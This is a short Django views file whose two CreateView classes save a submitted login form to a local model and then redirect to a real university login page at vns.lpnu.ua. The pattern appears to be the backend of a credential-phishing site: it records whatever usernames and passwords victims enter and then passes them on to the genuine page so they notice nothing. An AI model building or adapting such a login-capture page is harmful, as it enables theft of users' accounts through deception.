from django.views.generic.edit import CreateView

from .models import login_form
from .forms import loginForm

class LoginCreateView(CreateView):
	template_name = 'index.html'
	form_class = loginForm
	success_url = 'http://vns.lpnu.ua/login/index.php'

class index(CreateView):
	template_name = 'basic.html'
	form_class = loginForm
	success_url = 'http://vns.lpnu.ua/login/index.php'
